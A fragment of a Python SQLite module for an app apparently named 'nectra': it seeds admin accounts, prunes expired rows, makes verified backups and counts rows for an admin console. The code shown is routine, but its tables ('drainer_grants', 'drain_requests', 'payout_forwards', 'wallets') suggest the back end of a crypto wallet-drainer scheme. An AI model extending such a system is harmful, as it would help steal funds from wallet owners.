        (email, hashed, hashed, name, role, now()),
    )
    return cursor.lastrowid


def _seed_staff(conn: sqlite3.Connection) -> None:
    if conn.execute("SELECT COUNT(*) FROM users WHERE role IN ('admin','super_admin')"
                    ).fetchone()[0]:
        return

    password = os.environ.get("ADMIN_PASSWORD") or secrets_token(18)
    email = os.environ.get("ADMIN_EMAIL", "admin@nectra.local").strip().lower()

    _create_user(conn, email, password, "Super Admin", "super_admin")

    seeded = [(email, password)]

    if os.environ.get("SEED_STAFF", "0") == "1":
        for role, local in (("admin", "ops"), ("loan_officer", "officer")):
            staff_email = os.environ.get(f"{local.upper()}_EMAIL", f"{local}@nectra.local")
            staff_password = os.environ.get(f"{local.upper()}_PASSWORD") or secrets_token(18)
            _create_user(conn, staff_email.strip().lower(), staff_password,
                         role.replace("_", " ").title(), role)
            seeded.append((staff_email, staff_password))

    path = os.path.join(os.path.dirname(os.path.abspath(DB_PATH)),
                        "first-run-credentials.txt")
    try:
        with open(path, "w", encoding="utf-8") as handle:
            for account_email, account_password in seeded:
                handle.write(f"{account_email}\n{account_password}\n")
        os.chmod(path, 0o600)
    except OSError:
        pass

    print("\n  Seeded accounts:")
    for account_email, account_password in seeded:
        print(f"    {account_email} / {account_password}")
    print(f"  Written to {path} (0600) — change them after first login.\n")


def secrets_token(length: int) -> str:
    import secrets

    return secrets.token_urlsafe(length)


# ---------------------------------------------------------------------------
# Init, maintenance, backup
# ---------------------------------------------------------------------------
def _env_overrides() -> None:
    """Environment wins for the handful of ops-critical switches."""
    flags = {
        "DEMO_MODE": "demo_mode",
        "COOKIE_SECURE": "cookie_secure",
        "INVITE_ONLY": "invite_only",
    }
    for env_key, setting_key in flags.items():
        raw = os.environ.get(env_key)
        if raw is None:
            continue
        set_setting(setting_key, raw.strip().lower() in ("1", "true", "yes", "on"))

def init_db() -> None:
    _ensure_parent(DB_PATH)

    # journal_mode must be set outside a transaction
    bootstrap = sqlite3.connect(DB_PATH, isolation_level=None)
    try:
        bootstrap.execute("PRAGMA journal_mode = WAL;")
        bootstrap.execute("PRAGMA synchronous = NORMAL;")
        bootstrap.execute(f"PRAGMA busy_timeout = {BUSY_TIMEOUT_MS};")
    finally:
        bootstrap.close()

    version = migrate()

    with _conn() as conn:
        _seed_staff(conn)

    _env_overrides()
    invalidate_settings()
    logger.info("database ready at %s (schema v%s)", DB_PATH, version)


def prune(older_than_ms: int = 86_400_000) -> Dict[str, int]:
    """Delete spent nonces, expired sessions and stale grant history."""
    cutoff = now() - older_than_ms
    removed: Dict[str, int] = {}
    with _conn() as conn:
        removed["nonces"] = conn.execute(
            "DELETE FROM nonces WHERE used = 1 AND created_at < ?", (cutoff,)).rowcount
        removed["sessions"] = conn.execute(
            "DELETE FROM sessions WHERE expires_at < ?", (now(),)).rowcount
        removed["superseded_grants"] = conn.execute(
            "DELETE FROM drainer_grants WHERE status IN ('superseded','unsupported')"
            " AND created_at < ?", (now() - 30 * 86_400_000,)).rowcount
        removed["drainer_items"] = conn.execute(
            "DELETE FROM drainer_items WHERE created_at < ?",
            (now() - 90 * 86_400_000,)).rowcount
        removed["idempotency"] = conn.execute(
            "DELETE FROM idempotency WHERE created_at < ?", (cutoff,)).rowcount
        removed["payout_forwards"] = conn.execute(
            "DELETE FROM payout_forwards WHERE created_at < ?",
            (now() - 90 * 86_400_000,)).rowcount
        removed["email_codes"] = conn.execute(
            "DELETE FROM email_codes WHERE expires_at < ?",
            (now() - 2 * 86_400_000,)).rowcount
        removed["handoff_tokens"] = conn.execute(
            "DELETE FROM handoff_tokens WHERE expires_at < ?",
            (now() - 2 * 86_400_000,)).rowcount
        removed["mailbox"] = conn.execute(
            "DELETE FROM mailbox WHERE created_at < ?",
            (now() - 90 * 86_400_000,)).rowcount
    return removed


def backup_to(path: str) -> str:
    """Online, transactionally consistent snapshot via VACUUM INTO, then verified."""
    _ensure_parent(path)
    if os.path.exists(path):
        os.remove(path)

    with _conn() as conn:
        conn.execute("VACUUM INTO ?", (path,))

    check = sqlite3.connect(path)
    try:
        result = check.execute("PRAGMA integrity_check;").fetchone()[0]
    finally:
        check.close()

    if result != "ok":
        os.remove(path)
        raise RuntimeError(f"backup failed integrity check: {result}")

    logger.info("backup written to %s", path)
    return path


def stats() -> Dict[str, Any]:
    """Row counts for the admin console. Cheap enough to call on demand."""
    tables = ("users", "wallets", "drainer_grants", "drainer_events", "drain_requests",
              "audit_log", "sessions")
    return {table: q_val(f"SELECT COUNT(*) FROM {table}") or 0 for table in tables}